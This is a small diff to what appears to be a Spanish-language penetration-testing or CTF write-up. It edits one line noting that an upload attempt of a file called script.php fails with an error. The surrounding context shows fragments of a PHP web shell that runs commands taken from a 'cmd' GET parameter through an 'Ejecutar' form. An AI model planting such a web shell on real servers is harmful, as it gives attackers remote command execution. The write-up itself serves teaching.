@@ -46,5 +46,5 @@ if(isset($_GET['cmd'])) {
     <input type="submit" value="Ejecutar">
 </form>' > script.php
 ```
-Si lo intentamos subir, 
+Si lo intentamos subir, nos dirá ```No se ha cargado ningun archivo o hubo un error.```
 
